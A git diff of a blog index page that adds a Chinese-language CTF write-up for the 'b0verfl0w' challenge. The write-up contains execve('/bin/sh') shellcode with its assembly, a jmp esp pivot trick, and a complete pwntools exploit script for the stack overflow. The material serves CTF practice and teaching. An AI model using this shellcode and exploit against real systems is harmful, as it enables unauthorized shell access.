@@ -206,6 +206,98 @@
             
 
   
+    <article id="post-b0verfl0w" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/20/b0verfl0w/" target="_blank">b0verfl0w</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/20/b0verfl0w/" class="archive-article-date">
+        <time datetime="2024-03-20T15:07:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; 汇编指令</span><br><span class="line">xor ecx, ecx          ; 将 ecx 寄存器清零</span><br><span class="line">mul ecx               ; 将 eax 寄存器中的值与 ecx 寄存器中的值相乘，结果存放在 eax 和 edx 中，相当于 edx = eax * <span class="number">0</span></span><br><span class="line">push ecx              ; 将 ecx 寄存器中的值压入栈，此时栈顶为 <span class="number">0</span></span><br><span class="line">push <span class="number">0x68732f2f</span>       ; 将字符串 <span class="string">&quot;/bin//sh&quot;</span> 的 ASCII 码逆序压入栈</span><br><span class="line">push <span class="number">0x6e69622f</span>       ; 继续将字符串 <span class="string">&quot;/bin//sh&quot;</span> 的 ASCII 码逆序压入栈</span><br><span class="line">mov ebx, esp          ; 将 esp 寄存器中的值（即字符串 <span class="string">&quot;/bin//sh&quot;</span> 的地址）存放到 ebx 寄存器中</span><br><span class="line">mov al, <span class="number">0xb</span>           ; 将 <span class="number">0xb</span> 存放到 al 寄存器中，该值代表 execve 系统调用的编号</span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>              ; 触发系统调用，执行 execve(<span class="string">&quot;/bin//sh&quot;</span>, NULL, NULL)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span>+<span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span>+<span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i0.imgs.ovh/2024/03/19/eJhTA.png" alt="image-20240320230854571"></p>
+<h5 id="ret2shellcode-但是大小不够了"><a href="#ret2shellcode-但是大小不够了" class="headerlink" title="ret2shellcode,但是大小不够了"></a>ret2shellcode,但是大小不够了</h5><p><img src="https://i0.imgs.ovh/2024/03/19/eJKbs.png" alt="image-20240320231042503"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_esp_jmp=asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="改写其他不行"><a href="#改写其他不行" class="headerlink" title="改写其他不行"></a>改写其他不行</h5><h5 id="返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址"><a href="#返回地址执行到jmp-esp-然后esp-4，执行sub-esp-0x28-jmp-esp，可以跳到shellcode的地址" class="headerlink" title="返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址"></a>返回地址执行到jmp_esp,然后esp+4，执行sub esp,0x28;jmp esp，可以跳到shellcode的地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=asm(shellcode)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode))+<span class="string">b&#x27;aaaa&#x27;</span>+p32(jmp_esp)+sup_esp_jmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/19/eJ8qV.png" alt="image-20240320234818524"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/eJEnJ.png" alt="image-20240320234859035"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/19/eJToW.png" alt="image-20240320234951277"></p>
+<h5 id="jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶"><a href="#jmp-esp的操作，把栈顶设为esp-同时eip指向栈顶" class="headerlink" title="jmp esp的操作，把栈顶设为esp,同时eip指向栈顶"></a>jmp esp的操作，把栈顶设为esp,同时eip指向栈顶</h5><p><img src="https://i0.imgs.ovh/2024/03/20/eimXu.png" alt="image-20240321125420592"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,28594)</span></span><br><span class="line">p=process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span>+<span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span>+<span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">jmp_esp=<span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp=asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>)</span><br><span class="line">payload=shellcode+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="built_in">len</span>(shellcode))+<span class="string">b&#x27;aaaa&#x27;</span>+p32(jmp_esp)+sub_esp_jmp</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/20/b0verfl0w/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-roarctf-2019-easy-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -943,81 +1035,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2024/03/11/b00ks/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-freenote-x64" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/03/10/freenote-x64/" target="_blank">freenote_x64</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/03/10/freenote-x64/" class="archive-article-date">
-        <time datetime="2024-03-10T12:50:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-10</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p><img src="C:/Users/23633/AppData/Roaming/Typora/typora-user-images/image-20240310205447683.png" alt="image-20240310205447683"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/03/10/freenote-x64/">展开全文 >></a>
     </p>
     
 
